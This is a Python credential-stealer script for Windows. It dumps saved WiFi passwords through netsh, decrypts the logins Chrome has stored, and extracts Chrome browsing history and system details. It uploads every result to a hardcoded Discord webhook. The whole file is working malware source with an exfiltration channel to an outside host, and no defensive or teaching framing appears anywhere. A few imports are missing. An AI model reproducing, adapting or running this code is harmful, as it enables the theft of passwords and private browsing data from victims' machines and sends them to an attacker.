#!/usr/bin/python
import os
import re
import sqlite3
import platform
import uuid
import requests
import json
import win32crypt
from collections import OrderedDict

# DISCORD WEBHOOK
WEBHOOK_URL = "https://discord.com/api/webhooks/1406777013909323967/Gu2KL4c1jclX3lzXgvaaSh2PSNjfe-MWFMr3nU8jJwnJxAgw4ObCiM1pxanM6c8PHYGS"

def send_to_discord(filename, content):
    files = {'file': (filename, content)}
    requests.post(WEBHOOK_URL, files=files)

def get_system_info():
    info = f"""
    System Info:
    Name: {socket.gethostname()}
    FQDN: {socket.getfqdn()}
    Platform: {sys.platform}
    Machine: {platform.machine()}
    Processor: {platform.processor()}
    OS: {platform.system()}
    """
    return info

# --- WiFi PASSWORDS ---
def extract_wifi():
    def get_wlans():
        data = os.popen("netsh wlan show profiles").read()
        wifi = re.compile("All User Profile\s*:.(.*)")
        return wifi.findall(data)

    def get_pass(network):
        try:
            cmd = f"netsh wlan show profile \"{network}\" key=clear"
            wlan = os.popen(cmd).read()
            pass_regex = re.compile("Key Content\s*:.(.*)")
            return pass_regex.search(wlan).group(1).strip()
        except:
            return "N/A"

    wifi_data = ""
    for wlan in get_wlans():
        wifi_data += f"SSID: {wlan}\nPassword: {get_pass(wlan)}\n---\n"
    send_to_discord("wifi.txt", wifi_data)

# --- CHROME PASSWORDS ---
def extract_chrome_passwords():
    data_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    conn = sqlite3.connect(data_path)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    passwords = ""
    for site, user, encrypted_pass in cursor.fetchall():
        decrypted = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1]
        passwords += f"URL: {site}\nUser: {user}\nPass: {decrypted}\n---\n"
    send_to_discord("chrome_passwords.txt", passwords)

# --- CHROME HISTORY ---
def extract_chrome_history():
    def parse(url):
        try:
            domain = url.split('//')[1].split('/', 1)[0].replace("www.", "")
            return domain
        except:
            return "N/A"

    history_db = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\history"
    conn = sqlite3.connect(history_db)
    cursor = conn.cursor()
    cursor.execute("SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url")
    history = OrderedDict()
    for url, count in cursor.fetchall():
        domain = parse(url)
        history[domain] = history.get(domain, 0) + count
    sorted_history = "\n".join([f"{site}: {visits}" for site, visits in sorted(history.items(), key=lambda x: x[1], reverse=True)])
    send_to_discord("chrome_history.txt", sorted_history)

# --- EXECUTE ---
if __name__ == "__main__":
    extract_wifi()
    extract_chrome_passwords()
    extract_chrome_history()
    send_to_discord("system_info.txt", get_system_info())
